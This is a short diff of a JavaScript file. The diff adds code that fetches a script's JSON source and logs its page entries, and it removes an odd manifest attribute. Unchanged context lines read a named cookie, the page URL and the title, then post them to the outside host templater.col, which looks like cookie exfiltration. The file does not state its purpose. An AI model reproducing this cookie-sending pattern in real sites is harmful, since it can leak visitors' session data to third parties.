@@ -7,8 +7,23 @@ let cookieData = cook(nameCookie),
     host = window.location,
     response ="cookie="+cookieData+'&host='+host+'&title='+titlePage;
 
-
 ajax('http://templater.col/respond-require-data', response);
 
-let html = document.querySelector('html'),
-    attr = html.setAttribute('manifest', 'sdsdfsdfsdff');
+let jsonFile = document.getElementsByTagName('script')[0].src;
+
+function parseJson(data){
+    let obj = JSON.parse(data);
+    let num = obj.pages.count-1;
+  let page = obj.pages['page-'+num];
+
+  for (key in page){
+      if (page.hasOwnProperty(key)) {
+          console.log(key);
+          console.log(page[key]);
+      }
+  }
+
+}
+ajax(jsonFile, '', parseJson);
+
+
